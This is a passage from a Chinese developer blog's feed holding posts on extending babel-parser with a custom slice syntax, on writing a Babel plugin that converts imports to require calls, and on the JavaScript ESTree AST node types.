flow 需要关闭 js 报错，启用 eslint</p><pre><code class="lang-json">{  &quot;javascript.validate.enable&quot;: false,  &quot;eslint.format.enable&quot;: true,  &quot;editor.codeActionsOnSave&quot;: {    &quot;source.fixAll.eslint&quot;: true  },  &quot;[javascript]&quot;: {    &quot;editor.defaultFormatter&quot;: &quot;dbaeumer.vscode-eslint&quot;  }}</code></pre><p>新建 .vscode/launch.json，添加调试入口文件。</p><pre><code class="lang-json">{  &quot;version&quot;: &quot;0.2.0&quot;,  &quot;configurations&quot;: [    {      &quot;type&quot;: &quot;node&quot;,      &quot;request&quot;: &quot;launch&quot;,      &quot;name&quot;: &quot;Launch Program&quot;,      &quot;program&quot;: &quot;${workspaceFolder}/packages/babel-parser/test.js&quot;    }  ]}</code></pre><h3 id="断点调试"><a href="#断点调试" class="headerlink" title="断点调试"></a>断点调试</h3><p>在 packages/babel-parser/lib/index.js 入口函数 parse 添加断点。</p><pre><code class="lang-js">  function parse(input, options) {    ...-&gt;  return getParser(options, input).parse();  }</code></pre><p>这个入口函数会设置默认的 options 配置，最终调用 getParser().parse() 来解析</p><pre><code class="lang-js">  function getParser(options, input) {    let cls = Parser;    ...-&gt;  return new cls(options, input);  }</code></pre><p>进入 Parser 类，我们发现 Parser::parse 函数创建了 AST 的根节点 Program 和更上层的 File 节点，然后通过父类 StatementParser 的 parseTopLevel 函数开始解析最外层的语句到 File 节点。</p><pre><code class="lang-js">  class Parser extends StatementParser {    ...    parse() {      ...      const file = this.startNode();      const program = this.startNode();      this.nextToken();      file.errors = null;-&gt;    this.parseTopLevel(file, program);      file.errors = this.state.errors;      return file;    }  }</code></pre><p>我梳理了一下 Parser 类的继承关系：</p><pre><code class="lang-js">Parser &lt;: StatementParser &lt;: ExpressionParser &lt;: LValParser &lt;: NodeUtils &lt;: UtilParser &lt;: Tokenizer &lt;: ParserError &lt;: CommentsParser &lt;: BaseParser</code></pre><p>进入 StatementParser::parseTopLevel，这个函数调用 parseBlockBody，遇到 types.eof 停止，然后封装 Program、File 节点。</p><pre><code class="lang-js">  parseTopLevel(file, program) {    program.sourceType = this.options.sourceType;    program.interpreter = this.parseInterpreterDirective();-&gt;  this.parseBlockBody(program, true, true, types.eof);    ...    file.program = this.finishNode(program, &quot;Program&quot;);    file.comments = this.state.comments;    if (this.options.tokens) file.tokens = this.tokens;    return this.finishNode(file, &quot;File&quot;);  }</code></pre><p>进入 StatementParser::parseBlockBody</p><pre><code class="lang-js">  parseBlockBody(node, allowDirectives, topLevel, end, afterBlockParse) {    const body = node.body = [];    const directives = node.directives = [];-&gt;  this.parseBlockOrModuleBlockBody(body, allowDirectives ? directives : undefined, topLevel, end, afterBlockParse);  }</code></pre><p>进入 StatementParser::parseBlockOrModuleBlockBody，省略了部分代码，主逻辑还是很清晰的，就是逐语句解析并推入 AST 到 Program.body</p><pre><code class="lang-js">  parseBlockOrModuleBlockBody(body, directives, topLevel, end, afterBlockParse) {    ...    while (!this.match(end)) {-&gt;    const stmt = this.parseStatement(null, topLevel);      ...      body.push(stmt);    }    ...    this.next();  }</code></pre><p>进入 StatementParser::parseStatement，这里先判断了 Type[“@”] 解析装饰器语法，然后解析语句内容。</p><pre><code class="lang-js">  parseStatement(context, topLevel) {    if (this.match(types.at)) {      this.parseDecorators(true);    }-&gt;  return this.parseStatementContent(context, topLevel);  }</code></pre><p>进入 StatementParser::parseStatementContent，这是解析语句节点的关键函数，从这个大大的 switch 语句就能看出，如果对某些 AST 节点定义不了解可以参考我之前的文章 <a href="/2020/05/27/056_Javascript_ast/">《JS 语法树学习（全）》</a></p><pre><code class="lang-js">  parseStatementContent(context, topLevel) {    ...    switch (starttype) {      case types._break:      case types._continue:        return this.parseBreakContinueStatement(node, starttype.keyword);      case types._debugger:        return this.parseDebuggerStatement(node);      case types._do:        return this.parseDoStatement(node);      case types._for:        return this.parseForStatement(node);      case types._function:        ...        return this.parseFunctionStatement(node, false, !context);      case types._class:        ...        return this.parseClass(node, true);      case types._if:        return this.parseIfStatement(node);      case types._return:        return this.parseReturnStatement(node);      case types._switch:        return this.parseSwitchStatement(node);      case types._throw:        return this.parseThrowStatement(node);      case types._try:        return this.parseTryStatement(node);      case types._const:      case types._var:        ...        return this.parseVarStatement(node, kind);      case types._while:        return this.parseWhileStatement(node);      case types._with:        return this.parseWithStatement(node);      case types.braceL:        return this.parseBlock();      case types.semi:        return this.parseEmptyStatement(node);      case types._export:      case types._import:        ...      default:        if (this.isAsyncFunction()) {          ...          return this.parseFunctionStatement(node, true, !context);        }    }    const maybeName = this.state.value;-&gt;  const expr = this.parseExpression();    if (starttype === types.name &amp;&amp; expr.type === &quot;Identifier&quot; &amp;&amp; this.eat(types.colon)) {      return this.parseLabeledStatement(node, maybeName, expr, context);    } else {      return this.parseExpressionStatement(node, expr);    }  }</code></pre><p>如果没有被解析语句的 case 囊括并 return 跳出，就会流转到下面的表达式解析 parseExpression 并包装成 ExpressionStatement 或者 LabeledStatement 语句节点。</p><p>我们测试的代码是 a[1:3]，应该会进入 ExpressionParser::parseExpression 并抛出异常：</p><pre><code class="lang-js">parseExpression(noIn, refExpressionErrors) {  const startPos = this.state.start;  const startLoc = this.state.startLoc;  const expr = this.parseMaybeAssign(noIn, refExpressionErrors);  if (this.match(types.comma)) {    const node = this.startNodeAt(startPos, startLoc);    node.expressions = [expr];    while (this.eat(types.comma)) {      node.expressions.push(this.parseMaybeAssign(noIn, refExpressionErrors));    }    this.toReferencedList(node.expressions);    return this.finishNode(node, &quot;SequenceExpression&quot;);  }  return expr;}</code></pre><p>这里我们可以看出除了像 1, a&gt;b, !c 这样的 SequenceExpression (可以理解为多个表达式用逗号相连组成的一个大的表达式)，其他都会被 ExpressionParser::parseMaybeAssign 解析，到了这里，我们的解决方案就有了。</p><h2 id="创建-JS-的切片语法"><a href="#创建-JS-的切片语法" class="headerlink" title="创建 JS 的切片语法"></a>创建 JS 的切片语法</h2><p>我们可以在 <a href="https://python-ast-explorer.com/" target="_blank" rel="noopener">https://python-ast-explorer.com/</a> 查看 Python 的语法树结构</p><img src="/2020/06/09/058_Babel_custom_grammar/python_ast.png"><p>依葫芦画瓢，修改 ExpressionParser::parseExpression：</p><pre><code class="lang-js">parseExpression(noIn, refExpressionErrors) {  const startPos = this.state.start;  const startLoc = this.state.startLoc;  const expr = this.parseMaybeAssign(noIn, refExpressionErrors);  if (this.match(types.comma)) {    const node = this.startNodeAt(startPos, startLoc);    node.expressions = [expr];    while (this.eat(types.comma)) {      node.expressions.push(this.parseMaybeAssign(noIn, refExpressionErrors));    }    this.toReferencedList(node.expressions);    return this.finishNode(node, &quot;SequenceExpression&quot;);  }  // 判断冒号  if (this.match(types.colon)) {    // 新建空节点    const node = this.startNodeAt(startPos, startLoc);    // 上面解析的冒号左边的表达式    node.lower = expr;    // 吃掉冒号    this.eat(types.colon);    // 解析冒号右边的表达式    node.upper = this.parseMaybeAssign(noIn, refExpressionErrors);    // 完成节点，封装 Type 为 SliceExpression    return this.finishNode(node, &quot;SliceExpression&quot;);  }  return expr;}</code></pre><p>现在我们的 babel-parser 就有了解析我们 “自定义切片语法” 的能力，打印一下 AST：</p><pre><code class="lang-js">File {  program: Program {    body: [      ExpressionStatement {        expression: MemberExpression {          object: Identifier { name: &#39;a&#39; },          property: Node {            type: &#39;SliceExpression&#39;,            lower: NumericLiteral { value: 1 },            upper: NumericLiteral { value: 3 },          }        }      }    ]  }}</code></pre><h2 id="创建-Transform-插件"><a href="#创建-Transform-插件" class="headerlink" title="创建 Transform 插件"></a>创建 Transform 插件</h2><p>目前我们通过魔改 babel-parser 能够顺利的生成语法树，但是我们最终的目的是将 a[1:3] 解析成 a.slice(1,3)，如果对编写 Babel 插件不熟悉的童鞋可以参考我之前的文章 <a href="/2020/06/04/057_Babel_plugin/">《自己动手撸一个 Babel 插件》</a></p><img src="/2020/06/09/058_Babel_custom_grammar/slice_ast.png"><p>我们查看一下 a.slice(1,3) 的 AST，只要做一些小小的调整就成了：</p><pre><code class="lang-js">const types = require(&#39;@babel/types&#39;);const parser = require(&#39;@babel/parser&#39;);const traverse = require(&#39;@babel/traverse&#39;).default;const generator = require(&#39;@babel/generator&#39;).default;const transformSliceExpressionPlugin = {  visitor: {    ExpressionStatement(path) {      if (path.node.expression.type === &#39;MemberExpression&#39; &amp;&amp; path.node.expression.property.type === &#39;SliceExpression&#39;) {        const { object, property } = path.node.expression;        const { lower, upper } = property;        const memberExpression = types.memberExpression(object,  types.identifier(&#39;slice&#39;))        const callExpression = types.callExpression(memberExpression, [lower, upper]);        const expressionStatement = types.expressionStatement(callExpression);        path.replaceWith(expressionStatement)      }    }  }}// testconst code = &#39;a[1:3]&#39;;const ast = parser.parse(code);traverse(ast, transformSliceExpressionPlugin.visitor);const result = generator(ast);console.log(result.code);</code></pre><p>看到打印结果 a.slice(1, 3)</p><img src="/2020/06/09/058_Babel_custom_grammar/nice.jpg">]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Tech" scheme="https://vincent0700.com/categories/Tech/"/>
    
    
      <category term="FrontEnd" scheme="https://vincent0700.com/tags/FrontEnd/"/>
    
      <category term="Javascript" scheme="https://vincent0700.com/tags/Javascript/"/>
    
      <category term="Babel" scheme="https://vincent0700.com/tags/Babel/"/>
    
  </entry>
  
  <entry>
    <title>自己动手撸一个 Babel 插件</title>
    <link href="https://vincent0700.com/2020/06/04/057_Babel_plugin/"/>
    <id>https://vincent0700.com/2020/06/04/057_Babel_plugin/</id>
    <published>2020-06-04T13:00:00.000Z</published>
    <updated>2020-06-12T23:53:07.198Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>本文介绍了 Babel 的原理以及如何动手写一个 Babel 插件，如果对 JS 语法树不了解的童鞋可以参考我的上一篇文章 <a href="/2020/05/27/056_Javascript_ast/">《JS 语法树学习（全）》</a></p></blockquote><h2 id="Babel-原理简介"><a href="#Babel-原理简介" class="headerlink" title="Babel 原理简介"></a>Babel 原理简介</h2><p>Babel 工作原理分为下面三个阶段：</p><ol><li>Parse: 将代码解析成 AST</li><li>Transform: 遍历 AST，通过插件对节点进行添加、更新及移除等操作</li><li>Generate: 将 AST 转化成代码</li></ol><h2 id="案例讲解"><a href="#案例讲解" class="headerlink" title="案例讲解"></a>案例讲解</h2><p>下面我用一个简单的案例讲述如何构建一个 Babel 插件</p><pre><code class="lang-js">// 转换前import config from &#39;./config&#39;;// 转换后const config = require(&#39;./config&#39;);</code></pre><h3 id="转换前的-AST"><a href="#转换前的-AST" class="headerlink" title="转换前的 AST"></a>转换前的 AST</h3><p>Babel 的解析器 <a href="https://github.com/babel/babylon" target="_blank" rel="noopener">babylon</a> fork 至 <a href="https://github.com/acornjs/acorn" target="_blank" rel="noopener">acorn</a>，现在划到 babel 仓库下的 <a href="https://github.com/babel/babel/tree/master/packages/babel-parser" target="_blank" rel="noopener">@babel/parser</a>。我们可以通过 <a href="https://astexplorer.net/" target="_blank" rel="noopener">https://astexplorer.net/</a> 查看 acorn 解析后的语法树。</p><pre><code class="lang-js">// import config from &#39;./config&#39;;[  ImportDeclaration {    specifiers: [      ImportDefaultSpecifier {        local: Identifier { name: &quot;config&quot; }      }    ],    source: StringLiteral { value: &quot;./config&quot; }  }]</code></pre><h3 id="转换后的-AST"><a href="#转换后的-AST" class="headerlink" title="转换后的 AST"></a>转换后的 AST</h3><pre><code class="lang-js">// const config = require(&#39;./config&#39;);[  VariableDeclaration {    kind: &quot;const&quot;    declarations: [      VariableDeclarator {        id: Identifier { name: &quot;config&quot; },        init: CallExpression {          callee: Identifier { name: &quot;require&quot; },          arguments: StringLiteral { value: &quot;./config&quot; }        }      }    ]  }]</code></pre><h3 id="编写插件"><a href="#编写插件" class="headerlink" title="编写插件"></a>编写插件</h3><pre><code class="lang-js">const babel = require(&#39;@babel/core&#39;);const types = require(&#39;@babel/types&#39;);const myPlugin = {  visitor: {    ImportDeclaration(path) {      const specifier = path.node.specifiers[0];      // 判断说明符是 ImportDefaultSpecifier      if (types.isImportDefaultSpecifier(specifier)) {        const specName = specifier.local.name;        const srcPath = path.node.source.value;        // 构造新节点        const node = types.variableDeclaration(&#39;const&#39;, [          types.variableDeclarator(            types.identifier(specName),            types.callExpression(              types.identifier(&#39;require&#39;),              [types.stringLiteral(srcPath)]            )          )        ])        // 替换 ImportDeclaration 节点        path.replaceWith(node)      }    }  }}// testconst source = `import a from &#39;b&#39;`;const { code } = babel.transform(source, { plugins: [myPlugin] })console.log(code);</code></pre><p>这里 visitor 是访问者模式里的概念，有点类似于迭代器，可以理解为遍历 AST 时的 iterator，我们定义了 ImportDeclaration 属性，所以当遍历到 ImportDeclaration 节点的时候就会进入到我们的回调函数里。</p><p><code>@babel/types</code> 提供了判断和构造 AST 节点的能力。</p><p><code>ImportDeclaration(path: NodePath&lt;ImportDeclaration&gt;)</code> 中 <code>path</code>，为我们提供了操作 AST 节点的方法，但是它不等同于节点，它的定义在 <code>@babel/traverse</code> 中，其中一些重要属性可以参考下面这张图：</p><img src="/2020/06/04/057_Babel_plugin/path.png"><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>根据上面用例，我们基本了解了如何通过编写 Babel 插件来修改 AST，但是 Babel 插件的功能也仅限于在 Transform 阶段，例如我想创造一个这样的语法：</p><pre><code class="lang-js">// 转换前const arr = [1,2,3,4,5][1:3];// 转换后const arr = [1,2,3,4,5].slice(1,3);</code></pre><p>Babel 插件就无能为力了，因为语法解析器无法解析在 ArrayExpression 后面出现冒号的情况，如果想要在 Parse 阶段扩展词法和语法解析的能力，可以 fork Babel 源码进行修改，且听下回分解。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Tech" scheme="https://vincent0700.com/categories/Tech/"/>
    
    
      <category term="FrontEnd" scheme="https://vincent0700.com/tags/FrontEnd/"/>
    
      <category term="Javascript" scheme="https://vincent0700.com/tags/Javascript/"/>
    
      <category term="Babel" scheme="https://vincent0700.com/tags/Babel/"/>
    
  </entry>
  
  <entry>
    <title>JS 语法树学习（全）</title>
    <link href="https://vincent0700.com/2020/05/27/056_Javascript_ast/"/>
    <id>https://vincent0700.com/2020/05/27/056_Javascript_ast/</id>
    <published>2020-05-27T13:00:00.000Z</published>
    <updated>2021-03-06T02:54:47.808Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>最开始 <a href="https://developer.mozilla.org/en-US/docs/Mozilla/Projects/SpiderMonkey/Parser_API" target="_blank" rel="noopener">Mozilla JS Parser API</a> 是 Mozilla 工程师在 Firefox 中创建的 SpiderMonkey 引擎输出 JavaScript AST 的规范文档。而后随着 Javascript 更多语法的加入，<a href="https://github.com/estree/estree" target="_blank" rel="noopener">The ESTree Spec</a> 诞生了，作为参与构建和使用这些工具的人员的社区标准。这两者的区别在于 Parser API 中描述了一些特定于 SpiderMonkey 引擎的行为，而 ESTree 是社区规范，并且向后兼容 SpiderMonkey 格式。</p><h2 id="解析器"><a href="#解析器" class="headerlink" title="解析器"></a>解析器</h2><p>Parser 解析一般分为两步，词法分析和语法分析。本文使用 Acorn@7.2.0 作为 Javascript 的解析器，以下面的 JS 代码为例：</p><pre><code class="lang-javascript">const href = &#39;https://vincent0700.com&#39;</code></pre><h3 id="词法分析"><a href="#词法分析" class="headerlink" title="词法分析"></a>词法分析</h3><p>词法分析会把代码转化成令牌（Tokens）流，例如上面的案例，得到的结果大致如下：</p><pre><code class="lang-javascript">[  Token {    type: TokenType { label: &#39;const&#39;, keyword: &#39;const&#39; ... },    value: &#39;const&#39;, ...  },  Token {    type: TokenType { label: &#39;name&#39;, keyword: &#39;undefined&#39; ... },    value: &#39;href&#39;, ...  },  Token {    type: TokenType { label: &#39;=&#39;, keyword: &#39;undefined&#39; ... },    value: &#39;=&#39;, ...  },  Token {    type: TokenType { label: &#39;string&#39;, keyword: &#39;undefined&#39; ... },    value: &#39;https://vincent0700.com&#39;, ...  },  Token {    type: TokenType { label: &#39;eof&#39;, keyword: &#39;undefined&#39; ... },    value: undefined, ...]</code></pre><p>Token 的数据结构：</p><pre><code class="lang-ts">class Token {  type: TokenType  value: any  start: number  end: number  loc?: SourceLocation  range?: [number, number]}</code></pre><p>TokenType 的数据结构：</p><pre><code class="lang-ts">class TokenType {  label: string  keyword: string  beforeExpr: boolean  startsExpr: boolean  isLoop: boolean  isAssign: boolean  prefix: boolean  postfix: boolean  binop: number  updateContext?: (prevType: TokenType) =&gt; void}</code></pre><h3 id="语法分析"><a href="#语法分析" class="headerlink" title="语法分析"></a>语法分析</h3><p>根据词法分析得到的 Tokens 流，将其转换成 AST，得到的结果大致如下：</p><pre><code class="lang-javascript">Node {  type: &#39;Program&#39;,  sourceType: &#39;script&#39;,  body: [    Node {      type: &#39;VariableDeclaration&#39;,      kind: &#39;const&#39;,      declarations: [        Node {          type: &#39;VariableDeclaration&#39;,          kind: &#39;const&#39;          declarations: [            Node {              type: &#39;VariableDeclarator&#39;,              id: Node { type: &#39;Identifier&#39;, name: &#39;href&#39; },              init: Node { type: &#39;Literal&#39;, value: &#39;https://vincent0700.com&#39; }            }          ]        }      ]    }  ]}</code></pre><p>AST 的所有节点都是 Node 的实例，它的数据结构如下：</p><pre><code class="lang-ts">class Node {  type: string  start: number  end: number  loc?: SourceLocation  sourceFile?: string  range?: [number, number]}</code></pre><h2 id="ES5"><a href="#ES5" class="headerlink" title="ES5"></a>ES5</h2><p>Node 大致分为以下 8 个大类：</p><h3 id="Program-根节点"><a href="#Program-根节点" class="headerlink" title="Program 根节点"></a>Program 根节点</h3><pre><code class="lang-ts">interface Program &lt;: Node {    type: &quot;Program&quot;;    body: [ Statement ];}</code></pre><p>AST 的顶部， body 包含了多个 Statement（语句）节点。</p><h3 id="Identifier-标识符"><a href="#Identifier-标识符" class="headerlink" title="Identifier 标识符"></a>Identifier 标识符</h3><pre><code class="lang-ts">interface Identifier &lt;: Expression, Pattern {    type: &quot;Identifier&quot;;    name: string;}</code></pre><p>用户自定义的名称，如变量名，函数名，属性名等。</p><h3 id="Literal-字面量"><a href="#Literal-字面量" class="headerlink" title="Literal 字面量"></a>Literal 字面量</h3><pre><code class="lang-ts">interface Literal &lt;: Expression {    type: &quot;Literal&quot;;    value: string | boolean | null | number | RegExp;}</code></pre><p>从 value 的类型可以看出，字面量就是值，他的类型有字符串，布尔，数值，null 和正则。</p><h3 id="Statement-语句"><a href="#Statement-语句" class="headerlink" title="Statement 语句"></a>Statement 语句</h3><pre><code class="lang-ts">interface Statement &lt;: Node { }</code></pre><p>从根节点就可以看出，AST 是由 Statement 数组构成，我认为 Statement 应该是 AST 中除了 Program 最大的概念了，JS 的各种语法也是从 Statement 展开的：</p><ul><li>空语句 “;”<pre><code class="lang-ts">interface EmptyStatement &lt;: Statement {    type: &quot;EmptyStatement&quot;;}</code></pre></li><li>调试语句 “debugger;”<pre><code class="lang-ts">interface DebuggerStatement &lt;: Statement {    type: &quot;DebuggerStatement&quot;;}</code></pre></li><li>表达式语句 “1 + 1;”<pre><code class="lang-ts">interface ExpressionStatement &lt;: Statement {    type: &quot;ExpressionStatement&quot;;    expression: Expression;}</code></pre></li><li>块语句 “{[body]}”<pre><code class="lang-ts">interface BlockStatement &lt;: Statement {    type: &quot;BlockStatement&quot;;    body: [ Statement ];}</code></pre></li><li>With语句 “with ([object]) {[body]}”<pre><code class="lang-ts">interface WithStatement &lt;: Statement {    type: &quot;WithStatement&quot;;    object: Expression;    body: Statement;}</code></pre></li><li>流程控制语句<ul><li>Return语句 “return [argument]”<pre><code class="lang-ts">interface ReturnStatement &lt;: Statement {  type: &quot;ReturnStatement&quot;;  argument: Expression | null;}</code></pre></li><li>标签语句 “loop: … break loop;”<pre><code class="lang-ts">interface LabeledStatement &lt;: Statement {  type: &quot;LabeledStatement&quot;;  label: Identifier;  body: Statement;}</code></pre></li><li>Break语句 “break [label?];”<pre><code class="lang-ts">interface BreakStatement &lt;: Statement {  type: &quot;BreakStatement&quot;;  label: Identifier | null;}</code></pre></li><li>Continue语句 “continue [label?];”<pre><code class="lang-ts">interface ContinueStatement &lt;: Statement {  type: &quot;ContinueStatement&quot;;  label: Identifier | null;}</code></pre></li></ul></li><li>条件语句<ul><li>If语句 “if ([test]) {[consequent]} else {[alternate]}”<pre><code class="lang-ts">interface IfStatement &lt;: Statement {  type: &quot;IfStatement&quot;;  test: Expression;  consequent: Statement;  alternate: Statement | null;}</code></pre></li><li>Switch语句 “switch ([discriminant]) {[cases]}”<pre><code class="lang-ts">interface SwitchStatement &lt;: Statement {  type: &quot;SwitchStatement&quot;;  discriminant: Expression;  cases: [ SwitchCase ];}</code></pre><ul><li>SwitchCase节点 “case: [test]: [consequent]”<pre><code class="lang-ts">interface SwitchCase &lt;: Node {  type: &quot;SwitchCase&quot;;  test: Expression | null;  consequent: [ Statement ];}</code></pre></li></ul></li></ul></li><li>异常语句<ul><li>Throw语句 “throw [argument]”<pre><code class="lang-ts">interface ThrowStatement &lt;: Statement {  type: &quot;ThrowStatement&quot;;  argument: Expression;}</code></pre></li><li>Try语句 “try {[block]} catch {[handler]} finally {[finalizer]}”<pre><code class="lang-ts">interface TryStatement &lt;: Statement {  type: &quot;TryStatement&quot;;  block: BlockStatement;  handler: CatchClause | null;  finalizer: BlockStatement | null;}</code></pre><ul><li>Catch节点<pre><code class="lang-ts">interface CatchClause &lt;: Node {  type: &quot;CatchClause&quot;;  param: Pattern;  body: BlockStatement;}</code></pre></li></ul></li></ul></li><li>循环语句<ul><li>While语句 “while ([test] {[body]}”<pre><code class="lang-ts">interface WhileStatement &lt;: Statement {  type: &quot;WhileStatement&quot;;  test: Expression;  body: Statement;}</code></pre></li><li>DoWhile语句 “do {[test]} while ([body])”<pre><code class="lang-ts">interface DoWhileStatement &lt;: Statement {  type: &quot;DoWhileStatement&quot;;  body: Statement;  test: Expression;}</code></pre></li><li>For语句 “for ([init];[test];[update]) {[body]}”<pre><code class="lang-ts">interface ForStatement &lt;: Statement {  type: &quot;ForStatement&quot;;  init: VariableDeclaration | Expression | null;  test: Expression | null;  update: Expression | null;  body: Statement;}</code></pre></li><li>ForIn语句 “for ([left] in [right]) {[body]}”<pre><code class="lang-ts">interface ForInStatement &lt;: Statement {  type: &quot;ForInStatement&quot;;  left: VariableDeclaration |  Pattern;  right: Expression;  body: Statement;}</code></pre></li></ul></li></ul><h3 id="Declaration-声明语句"><a href="#Declaration-声明语句" class="headerlink" title="Declaration 声明语句"></a>Declaration 声明语句</h3><pre><code class="lang-ts">interface Declaration &lt;: Statement { }</code></pre><p>声明语句节点，同样也是语句，只是一个类型的细化。</p><ul><li>函数声明 “function [id] ([params]) {[body]}”<pre><code class="lang-ts">interface FunctionDeclaration &lt;: Function, Declaration {  type: &quot;FunctionDeclaration&quot;;  id: Identifier;}</code></pre><ul><li>函数<pre><code class="lang-ts">interface Function &lt;: Node {  id: Identifier | null;  params: [ Pattern ];  body: FunctionBody;}</code></pre></li></ul></li><li>变量声明 “var a = 10;”<pre><code class="lang-ts">interface VariableDeclaration &lt;: Declaration {  type: &quot;VariableDeclaration&quot;;  declarations: [ VariableDeclarator ];  kind: &quot;var&quot;;}</code></pre><ul><li>变量声明描述<pre><code class="lang-ts">interface VariableDeclarator &lt;: Node {  type: &quot;VariableDeclarator&quot;;  id: Pattern;  init: Expression | null;}</code></pre></li></ul></li></ul><h3 id="Expression-表达式"><a href="#Expression-表达式" class="headerlink" title="Expression 表达式"></a>Expression 表达式</h3><pre><code class="lang-ts">interface Expression &lt;: Node { }</code></pre><ul><li>This表达式 “this”<pre><code class="lang-ts">interface ThisExpression &lt;: Expression {  type: &quot;ThisExpression&quot;;}</code></pre></li><li>Array表达式 “[1, 2, 3]”<pre><code class="lang-ts">interface ArrayExpression &lt;: Expression {  type: &quot;ArrayExpression&quot;;  elements: [ Expression | null ];}</code></pre></li><li>Object表达式 “{ a: 1 }”<pre><code class="lang-ts">interface ObjectExpression &lt;: Expression {  type: &quot;ObjectExpression&quot;;  properties: [ Property ];}</code></pre><ul><li>属性节点<pre><code class="lang-ts">interface Property &lt;: Node {  type: &quot;Property&quot;;  key: Literal | Identifier;  value: Expression;  kind: &quot;init&quot; | &quot;get&quot; | &quot;set&quot;;}</code></pre></li></ul></li><li>函数表达式 “function ([params]) {[body]}”<pre><code class="lang-ts">interface FunctionExpression &lt;: Function, Expression {  type: &quot;FunctionExpression&quot;;}</code></pre></li><li>一元操作<ul><li>Unary表达式<pre><code class="lang-ts">interface UnaryExpression &lt;: Expression {  type: &quot;UnaryExpression&quot;;  operator: UnaryOperator;  prefix: boolean;  argument: Expression;}</code></pre><ul><li>Unary运算符 “typeof a”<pre><code class="lang-ts">enum UnaryOperator {  &quot;-&quot; | &quot;+&quot; | &quot;!&quot; | &quot;~&quot; | &quot;typeof&quot; | &quot;void&quot; | &quot;delete&quot;}</code></pre></li></ul></li><li>Update表达式 “a++” “—a”<pre><code class="lang-ts">interface UpdateExpression &lt;: Expression {  type: &quot;UpdateExpression&quot;;  operator: UpdateOperator;  argument: Expression;  prefix: boolean;}</code></pre><ul><li>Update运算符<pre><code class="lang-ts">enum UpdateOperator {  &quot;++&quot; | &quot;--&quot;}</code></pre></li></ul></li></ul></li><li>二元操作<ul><li>Binary表达式 “a &gt; b”<pre><code class="lang-ts">interface BinaryExpression &lt;: Expression {  type: &quot;BinaryExpression&quot;;  operator: BinaryOperator;  left: Expression;  right: Expression;}</code></pre><ul><li>Binary运算符<pre><code class="lang-ts">enum BinaryOperator {  &quot;==&quot; | &quot;!=&quot; | &quot;===&quot; | &quot;!==&quot;      | &quot;&lt;&quot; | &quot;&lt;=&quot; | &quot;&gt;&quot; | &quot;&gt;=&quot;      | &quot;&lt;&lt;&quot; | &quot;&gt;&gt;&quot; | &quot;&gt;&gt;&gt;&quot;      | &quot;+&quot; | &quot;-&quot; | &quot;*&quot; | &quot;/&quot; | &quot;%&quot;      | &quot;|&quot; | &quot;^&quot; | &quot;&amp;&quot; | &quot;in&quot;      | &quot;instanceof&quot;}</code></pre></li></ul></li></ul></li><li>赋值表达式 “a = 1”<pre><code class="lang-ts">interface AssignmentExpression &lt;: Expression {  type: &quot;AssignmentExpression&quot;;  operator: AssignmentOperator;  left: Pattern | Expression;  right: Expression;}</code></pre><ul><li>赋值运算符<pre><code class="lang-ts">enum AssignmentOperator {  &quot;=&quot; | &quot;+=&quot; | &quot;-=&quot; | &quot;*=&quot; | &quot;/=&quot; | &quot;%=&quot;      | &quot;&lt;&lt;=&quot; | &quot;&gt;&gt;=&quot; | &quot;&gt;&gt;&gt;=&quot;      | &quot;|=&quot; | &quot;^=&quot; | &quot;&amp;=&quot;}</code></pre></li></ul></li><li>逻辑表达式 “a &amp;&amp; b”<pre><code class="lang-ts">interface LogicalExpression &lt;: Expression {  type: &quot;LogicalExpression&quot;;  operator: LogicalOperator;  left: Expression;  right: Expression;}</code></pre><ul><li>逻辑运算符<pre><code class="lang-ts">enum LogicalOperator {  &quot;||&quot; | &quot;&amp;&amp;&quot;}</code></pre></li></ul></li><li>成员表达式 “a.b”<pre><code class="lang-ts">interface MemberExpression &lt;: Expression, Pattern {  type: &quot;MemberExpression&quot;;  object: Expression;  property: Expression;  computed: boolean;}</code></pre></li><li>条件表达式 “a &gt; b ? c : d”<pre><code class="lang-ts">interface ConditionalExpression &lt;: Expression {  type: &quot;ConditionalExpression&quot;;  test: Expression;  alternate: Expression;  consequent: Expression;}</code></pre></li><li>函数调用表达式 “func(1, 2)”<pre><code class="lang-ts">interface CallExpression &lt;: Expression {  type: &quot;CallExpression&quot;;  callee: Expression;  arguments: [ Expression ];}</code></pre></li><li>New表达式 “new Date()”<pre><code class="lang-ts">interface NewExpression &lt;: Expression {  type: &quot;NewExpression&quot;;  callee: Expression;  arguments: [ Expression ];}</code></pre></li><li>Sequence表达式 “1,2,3”<pre><code class="lang-ts">interface SequenceExpression &lt;: Expression {  type: &quot;SequenceExpression&quot;;  expressions: [ Expression ];}</code></pre></li></ul><h3 id="Patterns-模式"><a href="#Patterns-模式" class="headerlink" title="Patterns 模式"></a>Patterns 模式</h3><pre><code class="lang-ts">interface Pattern &lt;: Node { }</code></pre><p>主要在 ES6 的解构赋值中有意义，在 ES5 中，可以理解为和 Identifier 差不多的东西。</p><h2 id="ES2015"><a href="#ES2015" class="headerlink" title="ES2015"></a>ES2015</h2><h3 id="Program-根节点-1"><a href="#Program-根节点-1" class="headerlink" title="Program 根节点"></a>Program 根节点</h3><pre><code class="lang-ts">extend interface Program {    sourceType: &quot;script&quot; | &quot;module&quot;;    body: [ Statement | ModuleDeclaration ];}</code></pre><p>如果是 ES6 模块，必须指定 sourceType 为 “module”，否则将指定为 “script”。</p><h3 id="Function-函数"><a href="#Function-函数" class="headerlink" title="Function 函数"></a>Function 函数</h3><pre><code class="lang-ts">extend interface Function {    generator: boolean;}</code></pre><p>支持 Generator 函数</p><h3 id="Statement-语句-1"><a 